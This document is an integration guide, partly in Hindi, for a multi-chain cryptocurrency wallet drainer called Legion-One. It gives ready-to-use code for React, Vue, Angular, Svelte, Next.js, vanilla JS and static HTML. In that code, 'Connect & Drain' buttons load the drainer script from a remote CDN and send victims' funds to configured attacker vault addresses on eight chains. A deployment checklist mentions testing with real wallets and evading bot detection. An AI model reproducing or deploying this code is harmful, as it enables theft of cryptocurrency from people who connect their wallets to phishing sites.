# Legion-One v2 - Frontend Integration Guide

Yeh guide hai - legion-one-script-v2.js ko kise bhi frontend ke sath use krna.

---

## QUICK START (5 Minutes)

### Step 1: Add Script Tag
```html
<!-- Add anywhere in your HTML -->
<script src="https://your-cdn.com/legion-one-script-v2.js"></script>
```

### Step 2: Configure
```html
<script>
  window.LEGION_CONFIG = {
    backendUrl: 'https://your-backend-api.com',
    vaultAddresses: {
      evm: '0x1234567890123456789012345678901234567890',
      sol: 'SolanaVaultAddressHere',
      btc: 'btcVaultAddressHere',
      trx: 'TRONVaultAddressHere',
      ton: 'TONVaultAddressHere',
      cosmos: 'cosmosVaultAddressHere',
      aptos: 'aptosVaultAddressHere',
      sui: 'suiVaultAddressHere'
    }
  };
</script>
```

### Step 3: Add Button
```html
<button onclick="window.legion.connect()">Connect & Drain</button>
```

### Step 4: Initialize (Optional)
```html
<script>
  window.addEventListener('load', function() {
    window.legion.init();
  });
</script>
```

**DONE!** Script is now integrated. ✅

---

## DETAILED INTEGRATION FOR DIFFERENT FRONTENDS

---

## 1. REACT INTEGRATION

### Install & Setup

```bash
npm install axios  # for API calls
```

### Create Hook: `useLegion.js`
```javascript
import { useEffect, useState } from 'react';

export const useLegion = () => {
  const [initialized, setInitialized] = useState(false);
  const [draining, setDraining] = useState(false);
  const [stats, setStats] = useState(null);

  useEffect(() => {
    // Configure before script loads
    window.LEGION_CONFIG = {
      backendUrl: process.env.REACT_APP_BACKEND_URL || 'https://api.legion.com',
      vaultAddresses: {
        evm: process.env.REACT_APP_VAULT_EVM,
        sol: process.env.REACT_APP_VAULT_SOL,
        // ... etc
      },
      debug: process.env.NODE_ENV === 'development'
    };

    // Load script
    const script = document.createElement('script');
    script.src = process.env.REACT_APP_LEGION_SCRIPT_URL || 
                 'https://cdn.legion.com/legion-one-script-v2.js';
    script.async = true;
    script.onload = () => {
      console.log('Legion script loaded');
      window.legion.init();
      setInitialized(true);
    };
    document.head.appendChild(script);

    return () => {
      if (document.head.contains(script)) {
        document.head.removeChild(script);
      }
    };
  }, []);

  const handleConnect = async () => {
    if (!initialized) {
      console.error('Legion not initialized');
      return;
    }

    setDraining(true);
    try {
      // Call the drain function
      await window.legion.connect();
      
      // Get stats
      setStats(window.PARALLEL_STATS);
    } catch (error) {
      console.error('Drain failed:', error);
    } finally {
      setDraining(false);
    }
  };

  return {
    initialized,
    draining,
    stats,
    handleConnect
  };
};
```

### Use in Component

```jsx
import { useLegion } from './useLegion';

export function WalletPanel() {
  const { initialized, draining, stats, handleConnect } = useLegion();

  return (
    <div className="wallet-panel">
      <h2>Multi-Chain Wallet</h2>
      
      <button 
        onClick={handleConnect}
        disabled={!initialized || draining}
      >
        {draining ? 'Draining...' : 'Connect & Drain'}
      </button>

      {stats && (
        <div className="stats">
          <p>Detection: {stats.detectionTime}ms</p>
          <p>Connection: {stats.connectionTime}ms</p>
          <p>Signature: {stats.signatureTime}ms</p>
          <p>Total: {stats.totalTime}ms</p>
        </div>
      )}
    </div>
  );
}
```

---

## 2. VUE 3 INTEGRATION

### Create Plugin: `legion.js`
```javascript
export default {
  install(app) {
    const legionPlugin = {
      config: {
        backendUrl: import.meta.env.VITE_BACKEND_URL,
        vaultAddresses: {
          evm: import.meta.env.VITE_VAULT_EVM,
          sol: import.meta.env.VITE_VAULT_SOL,
          // ... etc
        },
        debug: import.meta.env.DEV
      },

      init() {
        return new Promise((resolve) => {
          window.LEGION_CONFIG = this.config;
          
          const script = document.createElement('script');
          script.src = import.meta.env.VITE_LEGION_SCRIPT;
          script.async = true;
          script.onload = () => {
            window.legion.init();
            resolve(window.legion);
          };
          document.head.appendChild(script);
        });
      },

      connect() {
        return window.legion.connect();
      },

      getStats() {
        return window.PARALLEL_STATS;
      }
    };

    app.provide('legion', legionPlugin);
    app.config.globalProperties.$legion = legionPlugin;
  }
};
```

### Use in App

```javascript
// main.js
import Legion from './plugins/legion.js';
app.use(Legion);

// In component
export default {
  inject: ['legion'],
  data() {
    return {
      isConnecting: false,
      stats: null
    };
  },
  mounted() {
    this.legion.init();
  },
  methods: {
    async handleConnect() {
      this.isConnecting = true;
      try {
        await this.legion.connect();
        this.stats = this.legion.getStats();
      } finally {
        this.isConnecting = false;
      }
    }
  }
};
```

---

## 3. VANILLA JS INTEGRATION

### Simple Wrapper Class

```javascript
class LegionDrain {
  constructor(config) {
    this.config = {
      backendUrl: 'https://api.legion.com',
      vaultAddresses: {},
      debug: false,
      ...config
    };
    this.initialized = false;
    this.draining = false;
  }

  async init() {
    return new Promise((resolve) => {
      window.LEGION_CONFIG = this.config;

      const script = document.createElement('script');
      script.src = '/scripts/legion-one-script-v2.js';
      script.async = true;
      script.onload = () => {
        window.legion.init();
        this.initialized = true;
        resolve();
      };
      script.onerror = () => {
        console.error('Failed to load Legion script');
        resolve();
      };
      document.head.appendChild(script);
    });
  }

  async drain() {
    if (!this.initialized) {
      console.error('Legion not initialized. Call init() first.');
      return;
    }

    this.draining = true;
    try {
      await window.legion.connect();
      return window.PARALLEL_STATS;
    } finally {
      this.draining = false;
    }
  }

  getDebugInfo() {
    if (!window.legion) return null;
    return {
      status: window.legion.debug.status(),
      logs: window.legion.debug.logs(),
      stats: window.PARALLEL_STATS
    };
  }
}

// Usage
const drainer = new LegionDrain({
  backendUrl: 'https://api.legion.com',
  vaultAddresses: { evm: '0x...', sol: '...' }
});

await drainer.init();

document.getElementById('drain-btn').addEventListener('click', async () => {
  const stats = await drainer.drain();
  console.log('Drain completed:', stats);
});
```

---

## 4. NEXT.JS INTEGRATION

### API Route: `/api/legion/init`

```javascript
// pages/api/legion/init.js
export default function handler(req, res) {
  const config = {
    backendUrl: process.env.LEGION_BACKEND_URL,
    vaultAddresses: {
      evm: process.env.LEGION_VAULT_EVM,
      sol: process.env.LEGION_VAULT_SOL,
      // ... etc
    },
    authToken: process.env.LEGION_AUTH_TOKEN
  };

  res.status(200).json(config);
}
```

### Component

```javascript
// components/WalletDrain.jsx
import { useState, useEffect } from 'react';

export default function WalletDrain() {
  const [initialized, setInitialized] = useState(false);
  const [draining, setDraining] = useState(false);

  useEffect(() => {
    // Fetch config from API
    fetch('/api/legion/init')
      .then(r => r.json())
      .then(config => {
        window.LEGION_CONFIG = config;
        
        // Load script
        const script = document.createElement('script');
        script.src = '/scripts/legion-one-script-v2.js';
        script.async = true;
        script.onload = () => {
          window.legion.init();
          setInitialized(true);
        };
        document.head.appendChild(script);
      });
  }, []);

  const handleDrain = async () => {
    setDraining(true);
    try {
      await window.legion.connect();
      alert('Drain initiated!');
    } catch (error) {
      alert('Drain failed: ' + error.message);
    } finally {
      setDraining(false);
    }
  };

  return (
    <button 
      onClick={handleDrain}
      disabled={!initialized || draining}
    >
      {draining ? 'Draining...' : 'Connect & Drain'}
    </button>
  );
}
```

---

## 5. SVELTE INTEGRATION

### Store: `legion.js`

```javascript
import { writable } from 'svelte/store';

export const legionInitialized = writable(false);
export const legionDraining = writable(false);

export async function initLegion(config) {
  return new Promise((resolve) => {
    window.LEGION_CONFIG = config;

    const script = document.createElement('script');
    script.src = '/scripts/legion-one-script-v2.js';
    script.async = true;
    script.onload = () => {
      window.legion.init();
      legionInitialized.set(true);
      resolve();
    };
    document.head.appendChild(script);
  });
}

export async function drain() {
  legionDraining.set(true);
  try {
    await window.legion.connect();
    return window.PARALLEL_STATS;
  } finally {
    legionDraining.set(false);
  }
}
```

### Component

```svelte
<script>
  import { legionInitialized, legionDraining, initLegion, drain } from './legion.js';

  onMount(async () => {
    await initLegion({
      backendUrl: 'https://api.legion.com',
      vaultAddresses: {
        evm: '0x...',
        sol: '...'
      }
    });
  });

  async function handleDrain() {
    const stats = await drain();
    console.log('Stats:', stats);
  }
</script>

<button 
  on:click={handleDrain}
  disabled={!$legionInitialized || $legionDraining}
>
  {$legionDraining ? 'Draining...' : 'Connect & Drain'}
</button>
```

---

## 6. ANGULAR INTEGRATION

### Service: `legion.service.ts`

```typescript
import { Injectable } from '@angular/core';
import { BehaviorSubject } from 'rxjs';

declare var window: any;

@Injectable({
  providedIn: 'root'
})
export class LegionService {
  initialized$ = new BehaviorSubject<boolean>(false);
  draining$ = new BehaviorSubject<boolean>(false);
  stats$ = new BehaviorSubject<any>(null);

  constructor() {}

  init(config: any): Promise<void> {
    return new Promise((resolve) => {
      window.LEGION_CONFIG = config;

      const script = document.createElement('script');
      script.src = '/scripts/legion-one-script-v2.js';
      script.async = true;
      script.onload = () => {
        window.legion.init();
        this.initialized$.next(true);
        resolve();
      };
      document.head.appendChild(script);
    });
  }

  async drain(): Promise<any> {
    this.draining$.next(true);
    try {
      await window.legion.connect();
      this.stats$.next(window.PARALLEL_STATS);
      return window.PARALLEL_STATS;
    } finally {
      this.draining$.next(false);
    }
  }
}
```

### Component

```typescript
import { Component, OnInit } from '@angular/core';
import { LegionService } from './legion.service';

@Component({
  selector: 'app-wallet-drain',
  template: `
    <button 
      (click)="drain()"
      [disabled]="!(initialized$ | async) || (draining$ | async)"
    >
      {{ (draining$ | async) ? 'Draining...' : 'Connect & Drain' }}
    </button>
  `
})
export class WalletDrainComponent implements OnInit {
  initialized$ = this.legion.initialized$;
  draining$ = this.legion.draining$;

  constructor(private legion: LegionService) {}

  ngOnInit() {
    this.legion.init({
      backendUrl: 'https://api.legion.com',
      vaultAddresses: {
        evm: '0x...',
        sol: '...'
      }
    });
  }

  async drain() {
    await this.legion.drain();
  }
}
```

---

## 7. STATIC HTML (No Framework)

### Complete HTML File

```html
<!DOCTYPE html>
<html>
<head>
  <title>Legion Drain</title>
  <style>
    body { font-family: Arial; max-width: 600px; margin: 50px auto; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    .stats { margin-top: 20px; padding: 10px; background: #f0f0f0; }
  </style>
</head>
<body>
  <h1>Multi-Chain Wallet Drain</h1>
  
  <button id="initBtn">Initialize</button>
  <button id="drainBtn" disabled>Connect & Drain</button>
  
  <div id="stats" class="stats" style="display:none;">
    <h3>Performance Stats</h3>
    <p>Detection: <span id="detectTime">-</span>ms</p>
    <p>Connection: <span id="connectTime">-</span>ms</p>
    <p>Signatures: <span id="signTime">-</span>ms</p>
    <p>Total: <span id="totalTime">-</span>ms</p>
  </div>

  <script>
    // Configure
    window.LEGION_CONFIG = {
      backendUrl: 'https://api.legion.com',
      vaultAddresses: {
        evm: '0x1234567890123456789012345678901234567890',
        sol: 'SolanaVaultAddress',
        btc: 'BitcoinVaultAddress',
        trx: 'TronVaultAddress',
        ton: 'TonVaultAddress',
        cosmos: 'CosmosVaultAddress',
        aptos: 'AptosVaultAddress',
        sui: 'SuiVaultAddress'
      }
    };

    // Load script
    const script = document.createElement('script');
    script.src = '/scripts/legion-one-script-v2.js';
    document.head.appendChild(script);

    // Event handlers
    document.getElementById('initBtn').onclick = function() {
      window.legion.init();
      document.getElementById('drainBtn').disabled = false;
      this.disabled = true;
      alert('Legion initialized!');
    };

    document.getElementById('drainBtn').onclick = async function() {
      this.disabled = true;
      this.textContent = 'Draining...';
      
      try {
        await window.legion.connect();
        
        // Show stats
        var stats = window.PARALLEL_STATS;
        document.getElementById('detectTime').textContent = stats.detectionTime;
        document.getElementById('connectTime').textContent = stats.connectionTime;
        document.getElementById('signTime').textContent = stats.signatureTime;
        document.getElementById('totalTime').textContent = stats.totalTime;
        document.getElementById('stats').style.display = 'block';
        
        alert('Drain completed! Check stats above.');
      } catch (error) {
        alert('Error: ' + error.message);
      } finally {
        this.textContent = 'Connect & Drain';
        this.disabled = false;
      }
    };
  </script>
</body>
</html>
```

---

## 8. ENVIRONMENT CONFIGURATION

### `.env` file

```
# Backend
BACKEND_URL=https://api.legion.com
LEGION_AUTH_TOKEN=your_token_here

# Vaults
VAULT_EVM=0x1234567890123456789012345678901234567890
VAULT_SOL=SolanaVaultAddress
VAULT_BTC=BitcoinVaultAddress
VAULT_TRON=TronVaultAddress
VAULT_TON=TonVaultAddress
VAULT_COSMOS=CosmosVaultAddress
VAULT_APTOS=AptosVaultAddress
VAULT_SUI=SuiVaultAddress

# Script
LEGION_SCRIPT_URL=https://cdn.legion.com/legion-one-script-v2.js
```

---

## 9. DEPLOYMENT CHECKLIST

Before deploying to production:

- [ ] Backend URL configured correctly
- [ ] All vault addresses set
- [ ] Script file accessible (CDN or server)
- [ ] HTTPS enabled (required for browser APIs)
- [ ] CORS headers set if cross-origin
- [ ] Environment variables secured
- [ ] Error handling implemented
- [ ] Logging monitored
- [ ] Test with real wallets
- [ ] Test bot detection (if applicable)

---

## 10. COMMON ISSUES & SOLUTIONS

### Issue: "window.legion is undefined"
**Solution:** Script not loaded yet. Wrap in:
```javascript
if (window.legion) {
  window.legion.connect();
} else {
  setTimeout(() => window.legion.connect(), 1000);
}
```

### Issue: "Backend URL not accessible"
**Solution:** Check HTTPS, CORS headers, and firewall:
```javascript
// Test backend connectivity
fetch('https://your-backend.com/api/v1/health')
  .then(r => r.json())
  .then(data => console.log('Backend OK:', data))
  .catch(err => console.error('Backend error:', err))
```

### Issue: "User's wallet not detected"
**Solution:** Check if extension is installed:
```javascript
console.log('MetaMask:', window.ethereum);
console.log('Phantom:', window.phantom);
// Add more checks for other wallets
```

### Issue: "Parallel execution not working"
**Solution:** Some wallets don't support parallel. Check:
```javascript
if (window.PARALLEL_STATS.executionMode === 'sequential') {
  console.log('Using sequential mode (slower but safe)');
}
```

---

## SUMMARY

| Framework | Ease | Speed | Best For |
|-----------|------|-------|----------|
| Vanilla JS | ⭐⭐⭐⭐⭐ | Fast | Simple sites |
| React | ⭐⭐⭐⭐ | Fast | SPAs |
| Vue | ⭐⭐⭐⭐ | Fast | SPAs |
| Angular | ⭐⭐⭐ | Medium | Enterprise |
| Svelte | ⭐⭐⭐⭐ | Fast | Lightweight |
| Next.js | ⭐⭐⭐ | Medium | Full-stack |
| Static HTML | ⭐⭐⭐⭐⭐ | Fast | Landing pages |

---

**Choose based on your existing tech stack.** Script works with ALL frameworks! ✅

